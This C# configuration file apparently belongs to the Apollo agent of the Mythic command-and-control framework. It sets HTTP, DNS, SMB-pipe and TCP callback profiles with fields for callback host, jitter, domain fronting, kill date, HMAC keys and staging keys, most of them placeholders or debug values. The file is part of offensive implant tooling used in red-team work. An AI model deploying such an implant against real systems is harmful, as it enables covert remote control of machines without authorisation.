﻿#define C2PROFILE_NAME_UPPER

#if DEBUG
#define HTTP
#endif

using HttpTransport;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
using NamedPipeTransport;
using TcpTransport;
using DnsTransport;

namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://mythic" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" }
#else
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "callback_port", "callback_port_here" },
                        { "callback_host", "callback_host_here" },
                        { "post_uri", "post_uri_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
                        { "proxy_host", "proxy_host_here" },
                        { "proxy_port", "proxy_port_here" },
                        { "proxy_user", "proxy_user_here" },
                        { "proxy_pass", "proxy_pass_here" },
                        { "domain_front", "domain_front_here" },
                        { "killdate", "killdate_here" },
                        { "USER_AGENT", "USER_AGENT_here" }
#endif
                    }
                }
            },
#endif
#if DNS
            { "dns", new C2ProfileData()
                {
                    TC2Profile = typeof(DnsProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_domains", "abc.domain1.com,abc.domain2.com" },
                        { "msginit", "init" },
                        { "msgdefault", "default" },
                        { "hmac_key", "HM4C_K3y@123" },
                        { "encrypted_exchange_check", "T" }
#else
                        { "callback_interval", "callback_interval_here" },
                        { "callback_jitter", "callback_jitter_here" },
                        { "callback_domains", "callback_domains_here" },
                        { "msginit", "msginit_here" },
                        { "msgdefault", "msgdefault_here" },
                        { "hmac_key", "hmac_key_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" }
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "pipename", "pipename_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if DEBUG
                        { "port", "25000" },
                        { "encrypted_exchange_check", "T" },
#else
                        { "port", "port_here" },
                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
#endif
                    }
                }
            }
#endif
                    };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if DEBUG
#if HTTP
        public static string StagingRSAPrivateKey = "AzY1NN6qNKfNzP3H6mAjKlUkl3k4hPtqiZ8etpVeUok=";
#elif SMB
        public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
#elif TCP
        public static string StagingRSAPrivateKey = "dlBOwdZdnAY1YH/6BZyn/wjkoDZk6IzZ75+p+JZ8V14=";
#endif
#if HTTP
        public static string PayloadUUID = "77bc19b5-05e5-41ca-a865-ea749c900014";
#elif SMB
        public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
#elif TCP
        public static string PayloadUUID = "1b79c340-b4ec-4801-b867-172fcb3491e5";
#endif
#else
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif
    }
}
